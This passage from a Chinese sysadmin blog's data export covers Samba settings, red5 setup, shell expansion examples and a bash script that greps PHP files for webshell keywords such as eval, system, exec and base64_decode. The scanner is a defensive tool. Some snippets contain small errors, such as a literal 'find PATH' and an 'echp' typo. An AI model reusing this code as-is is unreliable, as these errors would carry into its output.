–a来建立Samba用户，不过要建立的Samba用户必须先是系统用户。我们也可以使用<strong>pdbedit</strong>命 令来建立Samba账户。pdbedit命令的参数很多，我们列出几个主要的。pdbedit –a username：新建Samba账户。pdbedit –x username：删除Samba账户。pdbedit  –L：列出Samba用户列表，读取passdb.tdb数据库文件。pdbedit –Lv：列出Samba用户列表的详细信息。pdbedit –c “[D]” –u  username：暂停该Samba用户的账号。pdbedit –c “[]” –u  username：恢复该Samba用户的账号。<strong>3.ldapsam</strong><strong>：</strong>该 方式则是基于LDAP的账户管理方式来验证用户。首先要建立LDAP服务，然后设置“passdb backend &#x3D;  ldapsam:ldap:&#x2F;&#x2F;LDAP Server” <strong>encrypt passwords &#x3D; yes&#x2F;no</strong>说明：是否将认证密码加密。因为现在windows操作系统都是使用加密密 码，所以一般要开启此项。不过配置文件默认已开启。 <strong>smb passwd file &#x3D;  &#x2F;etc&#x2F;samba&#x2F;smbpasswd</strong>说明：用来定义samba用户的密码文件。smbpasswd文件如果没有 那就要手工新建。 <strong>username map &#x3D;  &#x2F;etc&#x2F;samba&#x2F;smbusers</strong>说明：用来定义用户名映射，比如可以将root换成 administrator、admin等。不过要事先在smbusers文件中定义好。比如：root &#x3D; administrator  admin，这样就可以用administrator或admin这两个用户来代替root登陆Samba  Server，更贴近windows用户的习惯。 <strong>guest account &#x3D; nobody</strong>说明：用来设置guest用户名。 <strong>socket options &#x3D;  TCP_NODELAY SO_RCVBUF&#x3D;8192 SO_SNDBUF&#x3D;8192</strong>说明：用来设置服务器和客户端之间会话的Socket选项，可以优化传输速 度。 <strong>domain master &#x3D; yes&#x2F;no </strong>说明：设置Samba服务器是否要成为网域主浏览器，网域主浏览器可以管理 跨子网域的浏览服务。 <strong>local master &#x3D; yes&#x2F;no</strong>说明：local master用来指定Samba  Server是否试图成为本地网域主浏览器。如果设为no，则永远不会成为本地网域主浏览器。但是即使设置为yes，也不等于该Samba  Server就能成为主浏览器，还需要参加选举。 <strong>preferred master &#x3D; yes&#x2F;no</strong>说明：设置Samba  Server一开机就强迫进行主浏览器选举，可以提高Samba  Server成为本地网域主浏览器的机会。如果该参数指定为yes时</p>\n"},{"title":"red5 简单安装","date":"2011-08-05T08:42:00.000Z","_content":"<p>#转载请注明出处 <a target=\"_blank\" href=\"http://hi.baidu.com/key1088\" rel=\"noopener noreferrer\">hi.baidu.com/key1088</a></p><p>by：key1088</p><p>red5是一种开源免费的服务器端软件，用于flash流媒体服务，有5大功能<br /><br />* 将音频（mp3）和视频（flv）转换成流<br />* 录像（输出为flv格式）<br />* 共享对象（这个比较爽）<br />* 视频直播（flv格式）<br />* 远程调用</p><p>1.安装</p><p>下载百度或google一下，就行。</p><p>red5是纯java的。所以要安装java平台，安装jdk，sun官方下就行。</p><p>注意版本，1.6或1.5都行。1.7不支持应用。</p><p>安装jdk很简单，我用的centos 5.5.。</p><p>如果你用源码安装，要下载apache-nat。</p><p>2.调试</p><p>设置环境变量，源码jdk的需要，rpm的就不需要了。</p><p>服务器必须要连接外网，因为要下载测试应用。</p><p>我下载的选项是other。为tar.gz包，直接解压就可以用了。</p><p>shell&gt;chmod +x *.sh</p><p>shell&gt;./red5.sh </p><p>一直输出，没有错误就差不多吧。</p><p>3.访问。</p><p>http://$ip:5080&nbsp; 测试能访问吗。</p><p><a target=\"_blank\" href=\"http://hiphotos.baidu.com/key1088/pic/item/3747b083409940bf9023d922.jpg\" rel=\"noopener noreferrer\"><img small=\"1\" src=\"/images/pic/3747b083409940bf9023d922.jpg\" /></a></p><p>http://$ip:5080/installer/&nbsp;&nbsp; 安装测试应用。你是什么版本的jdk就选择什么版本的。</p><p><a target=\"_blank\" href=\"http://hiphotos.baidu.com/key1088/pic/item/24f506daba8e4d8138012f27.jpg\" rel=\"noopener noreferrer\"><img small=\"1\" src=\"/images/pic/24f506daba8e4d8138012f27.jpg\" /></a></p><p>http://$ip:5080/demos/&nbsp;&nbsp;&nbsp; 测试选项。你可以选择你测试的东西。</p><p>http://$ip:5080/demos/BallControl.html&nbsp; 共享对象</p><p><a target=\"_blank\" href=\"http://hiphotos.baidu.com/key1088/pic/item/233631f84b08e70c024f56ee.jpg\" rel=\"noopener noreferrer\"><img small=\"1\" src=\"/images/pic/233631f84b08e70c024f56ee.jpg\" /></a></p><p>上面这个应用，效果为。你打开多个浏览器，连接成功后。</p><p>移动任意一个窗体内的图标，其他窗体内的图标也会一起移动。</p><p>测试OK。</p><p>&nbsp;</p><p>&nbsp;</p>","source":"_posts/red5-简单安装.md","raw":"title: red5 简单安装\ncategories: [Linux]\ntags: []\ndate: 2011-08-05 16:42:00\n---\n<p>#转载请注明出处 <a target=\"_blank\" href=\"http://hi.baidu.com/key1088\" rel=\"noopener noreferrer\">hi.baidu.com/key1088</a></p><p>by：key1088</p><p>red5是一种开源免费的服务器端软件，用于flash流媒体服务，有5大功能<br /><br />* 将音频（mp3）和视频（flv）转换成流<br />* 录像（输出为flv格式）<br />* 共享对象（这个比较爽）<br />* 视频直播（flv格式）<br />* 远程调用</p><p>1.安装</p><p>下载百度或google一下，就行。</p><p>red5是纯java的。所以要安装java平台，安装jdk，sun官方下就行。</p><p>注意版本，1.6或1.5都行。1.7不支持应用。</p><p>安装jdk很简单，我用的centos 5.5.。</p><p>如果你用源码安装，要下载apache-nat。</p><p>2.调试</p><p>设置环境变量，源码jdk的需要，rpm的就不需要了。</p><p>服务器必须要连接外网，因为要下载测试应用。</p><p>我下载的选项是other。为tar.gz包，直接解压就可以用了。</p><p>shell&gt;chmod +x *.sh</p><p>shell&gt;./red5.sh </p><p>一直输出，没有错误就差不多吧。</p><p>3.访问。</p><p>http://$ip:5080&nbsp; 测试能访问吗。</p><p><a target=\"_blank\" href=\"http://hiphotos.baidu.com/key1088/pic/item/3747b083409940bf9023d922.jpg\" rel=\"noopener noreferrer\"><img small=\"1\" src=\"/images/pic/3747b083409940bf9023d922.jpg\" /></a></p><p>http://$ip:5080/installer/&nbsp;&nbsp; 安装测试应用。你是什么版本的jdk就选择什么版本的。</p><p><a target=\"_blank\" href=\"http://hiphotos.baidu.com/key1088/pic/item/24f506daba8e4d8138012f27.jpg\" rel=\"noopener noreferrer\"><img small=\"1\" src=\"/images/pic/24f506daba8e4d8138012f27.jpg\" /></a></p><p>http://$ip:5080/demos/&nbsp;&nbsp;&nbsp; 测试选项。你可以选择你测试的东西。</p><p>http://$ip:5080/demos/BallControl.html&nbsp; 共享对象</p><p><a target=\"_blank\" href=\"http://hiphotos.baidu.com/key1088/pic/item/233631f84b08e70c024f56ee.jpg\" rel=\"noopener noreferrer\"><img small=\"1\" src=\"/images/pic/233631f84b08e70c024f56ee.jpg\" /></a></p><p>上面这个应用，效果为。你打开多个浏览器，连接成功后。</p><p>移动任意一个窗体内的图标，其他窗体内的图标也会一起移动。</p><p>测试OK。</p><p>&nbsp;</p><p>&nbsp;</p>","slug":"red5-简单安装","published":1,"updated":"2023-04-22T05:38:44.898Z","_id":"clgrjlxj4006f7opi0eh7dr2k","comments":1,"layout":"post","photos":[],"link":"","content":"<p>#转载请注明出处 <a target=\"_blank\" href=\"http://hi.baidu.com/key1088\" rel=\"noopener noreferrer\">hi.baidu.com/key1088</a></p><p>by：key1088</p><p>red5是一种开源免费的服务器端软件，用于flash流媒体服务，有5大功能<br /><br />* 将音频（mp3）和视频（flv）转换成流<br />* 录像（输出为flv格式）<br />* 共享对象（这个比较爽）<br />* 视频直播（flv格式）<br />* 远程调用</p><p>1.安装</p><p>下载百度或google一下，就行。</p><p>red5是纯java的。所以要安装java平台，安装jdk，sun官方下就行。</p><p>注意版本，1.6或1.5都行。1.7不支持应用。</p><p>安装jdk很简单，我用的centos 5.5.。</p><p>如果你用源码安装，要下载apache-nat。</p><p>2.调试</p><p>设置环境变量，源码jdk的需要，rpm的就不需要了。</p><p>服务器必须要连接外网，因为要下载测试应用。</p><p>我下载的选项是other。为tar.gz包，直接解压就可以用了。</p><p>shell&gt;chmod +x *.sh</p><p>shell&gt;./red5.sh </p><p>一直输出，没有错误就差不多吧。</p><p>3.访问。</p><p>http://$ip:5080&nbsp; 测试能访问吗。</p><p><a target=\"_blank\" href=\"http://hiphotos.baidu.com/key1088/pic/item/3747b083409940bf9023d922.jpg\" rel=\"noopener noreferrer\"><img small=\"1\" src=\"/images/pic/3747b083409940bf9023d922.jpg\" /></a></p><p>http://$ip:5080/installer/&nbsp;&nbsp; 安装测试应用。你是什么版本的jdk就选择什么版本的。</p><p><a target=\"_blank\" href=\"http://hiphotos.baidu.com/key1088/pic/item/24f506daba8e4d8138012f27.jpg\" rel=\"noopener noreferrer\"><img small=\"1\" src=\"/images/pic/24f506daba8e4d8138012f27.jpg\" /></a></p><p>http://$ip:5080/demos/&nbsp;&nbsp;&nbsp; 测试选项。你可以选择你测试的东西。</p><p>http://$ip:5080/demos/BallControl.html&nbsp; 共享对象</p><p><a target=\"_blank\" href=\"http://hiphotos.baidu.com/key1088/pic/item/233631f84b08e70c024f56ee.jpg\" rel=\"noopener noreferrer\"><img small=\"1\" src=\"/images/pic/233631f84b08e70c024f56ee.jpg\" /></a></p><p>上面这个应用，效果为。你打开多个浏览器，连接成功后。</p><p>移动任意一个窗体内的图标，其他窗体内的图标也会一起移动。</p><p>测试OK。</p><p>&nbsp;</p><p>&nbsp;</p>","site":{"data":{}},"excerpt":"","more":"<p>#转载请注明出处 <a target=\"_blank\" href=\"http://hi.baidu.com/key1088\" rel=\"noopener noreferrer\">hi.baidu.com/key1088</a></p><p>by：key1088</p><p>red5是一种开源免费的服务器端软件，用于flash流媒体服务，有5大功能<br /><br />* 将音频（mp3）和视频（flv）转换成流<br />* 录像（输出为flv格式）<br />* 共享对象（这个比较爽）<br />* 视频直播（flv格式）<br />* 远程调用</p><p>1.安装</p><p>下载百度或google一下，就行。</p><p>red5是纯java的。所以要安装java平台，安装jdk，sun官方下就行。</p><p>注意版本，1.6或1.5都行。1.7不支持应用。</p><p>安装jdk很简单，我用的centos 5.5.。</p><p>如果你用源码安装，要下载apache-nat。</p><p>2.调试</p><p>设置环境变量，源码jdk的需要，rpm的就不需要了。</p><p>服务器必须要连接外网，因为要下载测试应用。</p><p>我下载的选项是other。为tar.gz包，直接解压就可以用了。</p><p>shell&gt;chmod +x *.sh</p><p>shell&gt;./red5.sh </p><p>一直输出，没有错误就差不多吧。</p><p>3.访问。</p><p>http://$ip:5080&nbsp; 测试能访问吗。</p><p><a target=\"_blank\" href=\"http://hiphotos.baidu.com/key1088/pic/item/3747b083409940bf9023d922.jpg\" rel=\"noopener noreferrer\"><img small=\"1\" src=\"/images/pic/3747b083409940bf9023d922.jpg\" /></a></p><p>http://$ip:5080/installer/&nbsp;&nbsp; 安装测试应用。你是什么版本的jdk就选择什么版本的。</p><p><a target=\"_blank\" href=\"http://hiphotos.baidu.com/key1088/pic/item/24f506daba8e4d8138012f27.jpg\" rel=\"noopener noreferrer\"><img small=\"1\" src=\"/images/pic/24f506daba8e4d8138012f27.jpg\" /></a></p><p>http://$ip:5080/demos/&nbsp;&nbsp;&nbsp; 测试选项。你可以选择你测试的东西。</p><p>http://$ip:5080/demos/BallControl.html&nbsp; 共享对象</p><p><a target=\"_blank\" href=\"http://hiphotos.baidu.com/key1088/pic/item/233631f84b08e70c024f56ee.jpg\" rel=\"noopener noreferrer\"><img small=\"1\" src=\"/images/pic/233631f84b08e70c024f56ee.jpg\" /></a></p><p>上面这个应用，效果为。你打开多个浏览器，连接成功后。</p><p>移动任意一个窗体内的图标，其他窗体内的图标也会一起移动。</p><p>测试OK。</p><p>&nbsp;</p><p>&nbsp;</p>"},{"title":"scan webshell shell","date":"2011-06-21T01:48:00.000Z","_content":"<p>#!/bin/bash</p><p>#scan webshell shell</p><p>dire=/data// &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; # &nbsp; web path</p><p>exname=.php &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; # &nbsp; .php; .jsp; .php3</p><p>key=eval &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;# &nbsp; system; exec; base64_decode </p><p>page=$(find PATH -name &quot;*.php&quot; -type f )&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #这样效率会更高，修改用find</p><p>#page=$(du -a $dire|awk '{print $2}'|grep $exname)</p><p>for i in $page</p><p>do</p><p>test=$(cat $i |grep -i $key)</p><p>if [ ! -z &quot;$test&quot; ]</p><p>then</p><p>echo $i &gt;&gt; tmp &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;#</p><p>fi</p><p>done</p><p>&nbsp;</p><p>网站被黑后，如果网站动态页面，很难一一搜索，通过搜索webshell 里面常用的关键词，来节省一段时间。</p><p>实现方法很简单，思路就是这样。</p><p>遍历整个目录下的文件，搜索特出关键词（webshell里面的敏感关键词），然后重定向到一个文件。在检查这些文件，就快的多了。</p><p>&nbsp;</p><p></p><p>&nbsp;</p><p></p>","source":"_posts/scan-webshell-shell.md","raw":"title: scan webshell shell\ncategories: [网络安全,Shell编程]\ntags: []\ndate: 2011-06-21 09:48:00\n---\n<p>#!/bin/bash</p><p>#scan webshell shell</p><p>dire=/data// &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; # &nbsp; web path</p><p>exname=.php &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; # &nbsp; .php; .jsp; .php3</p><p>key=eval &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;# &nbsp; system; exec; base64_decode </p><p>page=$(find PATH -name &quot;*.php&quot; -type f )&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #这样效率会更高，修改用find</p><p>#page=$(du -a $dire|awk '{print $2}'|grep $exname)</p><p>for i in $page</p><p>do</p><p>test=$(cat $i |grep -i $key)</p><p>if [ ! -z &quot;$test&quot; ]</p><p>then</p><p>echo $i &gt;&gt; tmp &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;#</p><p>fi</p><p>done</p><p>&nbsp;</p><p>网站被黑后，如果网站动态页面，很难一一搜索，通过搜索webshell 里面常用的关键词，来节省一段时间。</p><p>实现方法很简单，思路就是这样。</p><p>遍历整个目录下的文件，搜索特出关键词（webshell里面的敏感关键词），然后重定向到一个文件。在检查这些文件，就快的多了。</p><p>&nbsp;</p><p></p><p>&nbsp;</p><p></p>","slug":"scan-webshell-shell","published":1,"updated":"2023-04-22T05:38:44.901Z","_id":"clgrjlxj4006g7opic5lsgev8","comments":1,"layout":"post","photos":[],"link":"","content":"<p>#!/bin/bash</p><p>#scan webshell shell</p><p>dire=/data// &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; # &nbsp; web path</p><p>exname=.php &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; # &nbsp; .php; .jsp; .php3</p><p>key=eval &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;# &nbsp; system; exec; base64_decode </p><p>page=$(find PATH -name &quot;*.php&quot; -type f )&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #这样效率会更高，修改用find</p><p>#page=$(du -a $dire|awk '{print $2}'|grep $exname)</p><p>for i in $page</p><p>do</p><p>test=$(cat $i |grep -i $key)</p><p>if [ ! -z &quot;$test&quot; ]</p><p>then</p><p>echo $i &gt;&gt; tmp &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;#</p><p>fi</p><p>done</p><p>&nbsp;</p><p>网站被黑后，如果网站动态页面，很难一一搜索，通过搜索webshell 里面常用的关键词，来节省一段时间。</p><p>实现方法很简单，思路就是这样。</p><p>遍历整个目录下的文件，搜索特出关键词（webshell里面的敏感关键词），然后重定向到一个文件。在检查这些文件，就快的多了。</p><p>&nbsp;</p><p></p><p>&nbsp;</p><p></p>","site":{"data":{}},"excerpt":"","more":"<p>#!/bin/bash</p><p>#scan webshell shell</p><p>dire=/data// &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; # &nbsp; web path</p><p>exname=.php &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; # &nbsp; .php; .jsp; .php3</p><p>key=eval &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;# &nbsp; system; exec; base64_decode </p><p>page=$(find PATH -name &quot;*.php&quot; -type f )&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #这样效率会更高，修改用find</p><p>#page=$(du -a $dire|awk '{print $2}'|grep $exname)</p><p>for i in $page</p><p>do</p><p>test=$(cat $i |grep -i $key)</p><p>if [ ! -z &quot;$test&quot; ]</p><p>then</p><p>echo $i &gt;&gt; tmp &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;#</p><p>fi</p><p>done</p><p>&nbsp;</p><p>网站被黑后，如果网站动态页面，很难一一搜索，通过搜索webshell 里面常用的关键词，来节省一段时间。</p><p>实现方法很简单，思路就是这样。</p><p>遍历整个目录下的文件，搜索特出关键词（webshell里面的敏感关键词），然后重定向到一个文件。在检查这些文件，就快的多了。</p><p>&nbsp;</p><p></p><p>&nbsp;</p><p></p>"},{"title":"shell 中$() 、 ${} and $(()) 用法","date":"2011-04-29T04:48:00.000Z","_content":"<p>脚本如下：</p><p><strong>#!/bin/bash<br />#test $() and ${} and $(())&nbsp; useges<br />#by:key1088@163.com<br />#mail:key1088@163.com<br /><br /><br />file=$(pwd)<br />echo $file<br />echo<br />echo '${file#*/}'<br />echo ${file#*/}<br />echo<br /><br />echo '${file##*/}'<br />echo ${file##*/}<br />echo<br /><br />echo '$(file%/*)'<br />echo ${file%%/*}<br />echo<br /><br />echo '${file/cis7/cis8/}'<br />echo ${file/cis7/cis8/}<br />echo<br /><br />echo '${file//cis7/cis8/}'<br />echo ${file//cis7/cis8/}<br />echo<br /><br />echo '${file:0:5}'<br />echo ${file:0:5}<br />echo<br /><br />echo '${file:5:5}'<br />echo ${file:5:5}<br />echo<br /><br />echo '$(#file)'<br />echo ${#file}<br />echo<br /><br />echo &quot; define arry=(a b c d)&quot;<br />arry=(a b c d)<br />echo '$arry'<br />echo $arry<br />echo<br />echo '${arry[*]}'<br />echo ${arry[*]}<br />echo<br /><br />echp &quot;define arry=&quot;a b c d&quot;&quot;<br />arry=&quot;a b c d&quot;<br />echo '$arry'<br />echo $arry<br />echo<br /><br />a=1<br />b=2<br /><br />echo<br />echo '$(($a+$b))'<br />echo $(($a+$b))<br /><br />echo<br />echo '$((a+1))'<br />echo $((a+1))&nbsp;&nbsp;<br /></strong></p><p><strong>#（（i++））<br /></strong></p><p><strong>#echo $i</strong></p><p>&nbsp;</p><p>&nbsp;</p><p>脚本执行</p><p>shell&gt;./text.sh</p><p>/videodata/cis7/pmkz/cis7<br /><br />${file#*/}<br />videodata/cis7/pmkz/cis7<br /><br />${file##*/}<br />cis7<br /><br />$(file%/*)<br /><br /><br />${file/cis7/cis8/}<br />/videodata/cis8//pmkz/cis7<br /><br />${file//cis7/cis8/}<br />/videodata/cis8//pmkz/cis8/<br /><br />${file:0:5}<br />/vide<br /><br />${file:5:5}<br />odata<br /><br />$(#file)<br />25<br /><br />&nbsp;define arry=(a b c d)<br />$arry<br />a<br /><br />${arry[*]}<br />a b c d<br /><br />./test.sh: line 51: echp: command not found<br />$arry<br />a b c d<br /><br /><br />$(($a+$b))<br />3<br /><br />$((a++))<br />2</p>","source":"_posts/shell-中$()-、-${}-and-$(())-用法.md","raw":"title: shell 中$() 、 ${} and $(()) 用法\ncategories: [Shell编程]\ntags: []\ndate: 2011-04-29 12:48:00\n---\n<p>脚本如下：</p><p><strong>#!/bin/bash<br />#test $() and ${} and $(())&nbsp; useges<br />#by:key1088@163.com<br />#mail:key1088@163.com<br /><br /><br />file=$(pwd)<br />echo $file<br />echo<br />echo '${file#*/}'<br />echo ${file#*/}<br />echo<br /><br />echo '${file##*/}'<br />echo ${file##*/}<br />echo<br /><br />echo '$(file%/*)'<br />echo ${file%%/*}<br />echo<br /><br />echo '${file/cis7/cis8/}'<br />echo ${file/cis7/cis8/}<br />echo<br /><br />echo '${file//cis7/cis8/}'<br />echo ${file//cis7/cis8/}<br />echo<br /><br />echo '${file:0:5}'<br />echo ${file:0:5}<br />echo<br /><br />echo '${file:5:5}'<br />echo ${file:5:5}<br />echo<br /><br />echo '$(#file)'<br />echo ${#file}<br />echo<br /><br />echo &quot; define arry=(a b c d)&quot;<br />arry=(a b c d)<br />echo '$arry'<br />echo $arry<br />echo<br />echo '${arry[*]}'<br />echo ${arry[*]}<br />echo<br /><br />echp &quot;define arry=&quot;a b c d&quot;&quot;<br />arry=&quot;a b c d&quot;<br />echo '$arry'<br />echo $arry<br />echo<br /><br />a=1<br />b=2<br /><br />echo<br />echo '$(($a+$b))'<br />echo $(($a+$b))<br /><br />echo<br />echo '$((a+1))'<br />echo $((a+1))&nbsp;&nbsp;<br /></strong></p><p><strong>#（（i++））<br /></strong></p><p><strong>#echo $i</strong></p><p>&nbsp;</p><p>&nbsp;</p><p>脚本执行</p><p>shell&gt;./text.sh</p><p>/videodata/cis7/pmkz/cis7<br /><br />${file#*/}<br />videodata/cis7/pmkz/cis7<br /><br />${file##*/}<br />cis7<br /><br />$(file%/*)<br /><br /><br />${file/cis7/cis8/}<br />/videodata/cis8//pmkz/cis7<br /><br />${file//cis7/cis8/}<br />/videodata/cis8//pmkz/cis8/<br /><br />${file:0:5}<br />/vide<br /><br />${file:5:5}<br />odata<br /><br />$(#file)<br />25<br /><br />&nbsp;define arry=(a b c d)<br />$arry<br />a<br /><br />${arry[*]}<br />a b c d<br /><br />./test.sh: line 51: echp: command not found<br />$arry<br />a b c d<br /><br /><br />$(($a+$b))<br />3<br /><br />$((a++))<br />2</p>","slug":"shell-中$()-、-${}-and-$(())-用法","published":1,"updated":"2023-04-22T05:38:44.903Z","_id":"clgrjlxj7006i7opigriu4ii8","comments":1,"layout":"post","photos":[],"link":"","content":"<p>脚本如下：</p><p><strong>#!/bin/bash<br />#test $() and ${} and $(())&nbsp; useges<br />#by:key1088@163.com<br />#mail:key1088@163.com<br /><br /><br />file=$(pwd)<br />echo $file<br />echo<br />echo '${file#*/}'<br />echo ${file#*/}<br />echo<br /><br />echo '${file##*/}'<br />echo ${file##*/}<br />echo<br /><br />echo '$(file%/*)'<br />echo ${file%%/*}<br />echo<br /><br />echo '${file/cis7/cis8/}'<br />echo ${file/cis7/cis8/}<br />echo<br /><br />echo '${file//cis7/cis8/}'<br />echo ${file//cis7/cis8/}<br />echo<br /><br />echo '${file:0:5}'<br />echo ${file:0:5}<br />echo<br /><br />echo '${file:5:5}'<br />echo ${file:5:5}<br />echo<br /><br />echo '$(#file)'<br />echo $","site":{"data":{}},"excerpt":"","more":"<p>脚本如下：</p><p><strong>#!/bin/bash<br />#test $() and ${} and $(())&nbsp; useges<br />#by:key1088@163.com<br />#mail:key1088@163.com<br /><br /><br />file=$(pwd)<br />echo $file<br />echo<br />echo '${file#*/}'<br />echo ${file#*/}<br />echo<br /><br />echo '${file##*/}'<br />echo ${file##*/}<br />echo<br /><br />echo '$(file%/*)'<br />echo ${file%%/*}<br />echo<br /><br />echo '${file/cis7/cis8/}'<br />echo ${file/cis7/cis8/}<br />echo<br /><br />echo '${file//cis7/cis8/}'<br />echo ${file//cis7/cis8/}<br />echo<br /><br />echo '${file:0:5}'<br />echo ${file:0:5}<br />echo<br /><br />echo '${file:5:5}'<br />echo ${file:5:5}<br />echo<br /><br />echo '$(#file)'<br />echo $"},{"title":"shell 字符串、数字比较","date":"2011-04-22T12:30:00.000Z","_content":"二元比较操作符,比较变量或者比较数字.注意数字与字符串的区别.&nbsp;<br />整数比较&nbsp;<br />-eq &nbsp; &nbsp; &nbsp; 等于,如:if [ &quot;$a&quot; -eq &quot;$b&quot; ]&nbsp;-ne &nbsp; &nbsp; &nbsp; 不等于,如:if [ &quot;$a&quot; -ne &quot;$b&quot; ]&nbsp;-gt &nbsp; &nbsp; &nbsp; 大于,如:if [ &quot;$a&quot; -gt &quot;$b&quot; ]&nbsp;-ge &nbsp; &nbsp; &nbsp; 大于等于,如:if [ &quot;$a&quot; -ge &quot;$b&quot; ]&nbsp;-lt &nbsp; &nbsp; &nbsp; 小于,如:if [ &quot;$a&quot; -lt &quot;$b&quot; ]&nbsp;-le &nbsp; &nbsp; &nbsp; 小于等于,如:if [ &quot;$a&quot; -le &quot;$b&quot; ]&nbsp;&lt; &nbsp; &nbsp; &nbsp; 小于(需要双括号),如:((&quot;$a&quot; &lt; &quot;$b&quot;))&nbsp;&lt;= &nbsp; &nbsp; &nbsp; 小于等于(需要双括号),如:((&quot;$a&quot; &lt;= &quot;$b&quot;))&nbsp;&gt; &nbsp; &nbsp; &nbsp; 大于(需要双括号),如:((&quot;$a&quot; &gt; &quot;$b&quot;))&nbsp;&gt;= &nbsp; &nbsp; &nbsp; 大于等于(需要双括号),如:((&quot;$a&quot; &gt;= &quot;$b&quot;))&nbsp;<br />字符串比较&nbsp;= &nbsp; &nbsp; &nbsp; 等于,如:if [ &quot;$a&quot; = &quot;$b&quot; ]&nbsp;== &nbsp; &nbsp; &nbsp; 等于,如:if [ &quot;$a&quot; == &quot;$b&quot; ],与=等价&nbsp;&nbsp;&nbsp; &nbsp; &nbsp; 注意:==的功能在[[]]和[]中的行为是不同的,如下:&nbsp;&nbsp;&nbsp; &nbsp; &nbsp; 1 [[ $a == z* ]] &nbsp; &nbsp;# 如果$a以&quot;z&quot;开头(模式匹配)那么将为true&nbsp;&nbsp;&nbsp; &nbsp; &nbsp; 2 [[ $a == &quot;z*&quot; ]] # 如果$a等于z*(字符匹配),那么结果为true&nbsp;&nbsp;&nbsp; &nbsp; &nbsp; 3&nbsp;&nbsp;&nbsp; &nbsp; &nbsp; 4 [ $a == z* ] &nbsp; &nbsp; &nbsp;# File globbing 和word splitting将会发生&nbsp;&nbsp;&nbsp; &nbsp; &nbsp; 5 [ &quot;$a&quot; == &quot;z*&quot; ] # 如果$a等于z*(字符匹配),那么结果为true&nbsp;&nbsp;&nbsp; &nbsp; &nbsp; 一点解释,关于File globbing是一种关于文件的速记法,比如&quot;*.c&quot;就是,再如~也是.&nbsp;&nbsp;&nbsp; &nbsp; &nbsp; 但是file globbing并不是严格的正则表达式,虽然绝大多数情况下结构比较像.&nbsp;!= &nbsp; &nbsp; &nbsp; 不等于,如:if [ &quot;$a&quot; != &quot;$b&quot; ]&nbsp;&nbsp;&nbsp; &nbsp; &nbsp; 这个操作符将在[[]]结构中使用模式匹配.&nbsp;&lt; &nbsp; &nbsp; &nbsp; 小于,在ASCII字母顺序下.如:&nbsp;&nbsp;&nbsp; &nbsp; &nbsp; if [[ &quot;$a&quot; &lt; &quot;$b&quot; ]]&nbsp;&nbsp;&nbsp; &nbsp; &nbsp; if [ &quot;$a&quot; &lt; &quot;$b&quot; ]&nbsp;&nbsp;&nbsp; &nbsp; &nbsp; 注意:在[]结构中&quot;&lt;&quot;需要被转义.&nbsp;&gt; &nbsp; &nbsp; &nbsp; 大于,在ASCII字母顺序下.如:&nbsp;&nbsp;&nbsp; &nbsp; &nbsp; if [[ &quot;$a&quot; &gt; &quot;$b&quot; ]]&nbsp;&nbsp;&nbsp; &nbsp; &nbsp; if [ &quot;$a&quot; &gt; &quot;$b&quot; ]&nbsp;&nbsp;&nbsp; &nbsp; &nbsp; 注意:在[]结构中&quot;&gt;&quot;需要被转义.&nbsp;-z &nbsp; &nbsp; &nbsp; 字符串为&quot;null&quot;.就是长度为0.&nbsp;-n &nbsp; &nbsp; &nbsp; 字符串不为&quot;null&quot; <br />","source":"_posts/shell-字符串、数字比较.md","raw":"title: shell 